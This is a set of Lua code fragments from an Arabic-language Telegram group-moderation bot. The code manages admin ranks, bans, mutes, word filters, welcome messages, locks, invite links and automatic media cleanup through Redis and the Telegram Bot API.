local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_)
...
local List = DevAbs:smembers(SURSBER..'Rio:Muted:'..msg.chat_id_)
...
local List = DevAbs:smembers(SURSBER..'Rio:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
local List = DevAbs:smembers(SURSBER..'Rio:Ban:'..msg.chat_id_)
...
local List = DevAbs:smembers(SURSBER..'User:Donky:'..msg.chat_id_)
...
local List = DevAbs:hkeys(SURSBER..'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevAbs:smembers(SURSBER..'Rio:RioSudo:')
...
local List = DevAbs:smembers(SURSBER..'Rio:SecondSudo:')
...
local BanAll = DevAbs:smembers(SURSBER..'Rio:BanAll:')
local MuteAll = DevAbs:smembers(SURSBER..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevAbs:smembers(SURSBER..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevAbs:get(SURSBER..'Rio:Sudos'..v) 
local username = DevAbs:get(SURSBER..'Save:UserName'..v)
if username then
...
DevAbs:sadd(SURSBER.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAbs:srem(SURSBER.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAbs:srem(SURSBER.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAbs:srem(SURSBER.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevAbs:get(SURSBER..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevAbs:sismember(SURSBER..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(SURSBER..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(SURSBER..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(SURSBER..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevAbs:sismember(SURSBER..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevAbs:get(SURSBER..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevAbs:sismember(SURSBER..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(SURSBER..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(SURSBER..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(SURSBER..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevAbs:sismember(SURSBER..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevAbs:get(SURSBER..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevAbs:sismember(SURSBER..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(SURSBER..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(SURSBER..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(SURSBER..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevAbs:sismember(SURSBER..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevAbs:get(SURSBER..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(SURSBER..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(SURSBER..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbs:sismember(SURSBER..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbs:sismember(SURSBER..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevAbs:sismember(SURSBER..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(SURSBER..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(SURSBER..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbs:sismember(SURSBER..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbs:sismember(SURSBER..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:BanAll:',result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,user) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,user) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,user) DevAbs:srem(SURSBER..'Rio:BanAll:',user) DevAbs:srem(SURSBER..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,user) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,user) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,result.id_) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,result.id_) DevAbs:srem(SURSBER..'Rio:BanAll:',result.id_) DevAbs:srem(SURSBER..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevAbs:srem(SURSBER..'Rio:Ban:'..msg.chat_id_,result.id_) DevAbs:srem(SURSBER..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevAbs:set(SURSBER.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevAbs:set("SURSBER:New:id:"..SURSBER..msg.sender_user_id_,'SURSBERTeam')
return "SURSBERTeam"
end
if text and DevAbs:get("SURSBER:New:id:"..SURSBER..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("SURSBER:New:id:"..SURSBER..msg.sender_user_id_)
return false
end
DevAbs:del("SURSBER:New:id:"..SURSBER..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevAbs:set(SURSBER.."Rio:AllIds:Text",text)
return false
end
...
DevAbs:del(SURSBER.."Rio:AllIds:Text")
end
end
--     Source SURSBER     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevAbs:set("SURSBER:New:id:"..SURSBER..msg.chat_id_..msg.sender_user_id_,'SURSBERTeam')
return "SURSBERTeam"
end
if text and Manager(msg) and DevAbs:get("SURSBER:New:id:"..SURSBER..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("SURSBER:New:id:"..SURSBER..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAbs:del("SURSBER:New:id:"..SURSBER..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevAbs:set(SURSBER.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevAbs:del(SURSBER.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source SURSBER     --
if msg.reply_to_message_id_ ~= 0 then
...
local msgsday = DevAbs:get(SURSBER..'Rio:UsersMsgs'..SURSBER..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevAbs:get(SURSBER..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(SURSBER..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevAbs:get(SURSBER..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(SURSBER..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevAbs:get(SURSBER..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevAbs:get(SURSBER..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevAbs:get(SURSBER.."Rio:AllIds:Text") then
newpicid = DevAbs:get(SURSBER.."Rio:AllIds:Text")
...
if not DevAbs:get(SURSBER.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get(SURSBER.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevAbs:get(SURSBER.."Rio:AllIds:Text") then
newallid = DevAbs:get(SURSBER.."Rio:AllIds:Text")
...
if DevAbs:get(SURSBER.."Rio:AllIds:Text") then
notpicid = DevAbs:get(SURSBER.."Rio:AllIds:Text")
...
if not DevAbs:get(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevAbs:set(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevAbs:set(SURSBER.."Rio:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل البوتات بالطرد")  
DevAbs:set(SURSBER.."Rio:Lock:Bots"..msg.chat_id_,"kick")  
end
...
DevAbs:set(SURSBER.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevAbs:get(SURSBER..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevAbs:set(SURSBER.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevAbs:set(SURSBER..'Rio:Lock:Pin'..msg.chat_id_,true)
DevAbs:sadd(SURSBER.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source SURSBER     --
...
DevAbs:setex(SURSBER.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevAbs:get(SURSBER.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevAbs:set(SURSBER.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevAbs:get(SURSBER..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevAbs:del(SURSBER..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(SURSBER..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevAbs:set(SURSBER..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevAbs:set(SURSBER..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevAbs:del(SURSBER..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevAbs:get(SURSBER..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source SURSBER     --
if DevAbs:get(SURSBER..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevAbs:del(SURSBER..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(SURSBER..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevAbs:set(SURSBER..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevAbs:set(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevAbs:get(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevAbs:del(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevAbs:del(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevAbs:hset(SURSBER..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevAbs:set(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevAbs:get(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevAbs:del(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevAbs:hget(SURSBER..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevAbs:del(SURSBER.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevAbs:hdel(SURSBER..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevAbs:scard(SURSBER.."Rio:Groups") local users = DevAbs:scard(SURSBER.."Rio:Users") 
...
local users = DevAbs:scard(SURSBER.."Rio:Users")
...
local gps = DevAbs:scard(SURSBER.."Rio:Groups")
...
if not DevAbs:get(SURSBER..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevAbs:setex(SURSBER..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevAbs:smembers(SURSBER.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevAbs:srem(SURSBER.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevAbs:smembers(SURSBER.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevAbs:srem(SURSBER.."Rio:Groups",group[i]) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevAbs:set(SURSBER..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevAbs:get(SURSBER..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevAbs:get(SURSBER..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevAbs:get(SURSBER..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevAbs:scard(SURSBER.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevAbs:smembers(SURSBER.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevAbs:del(SURSBER.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevAbs:scard(SURSBER.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevAbs:get(SURSBER..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
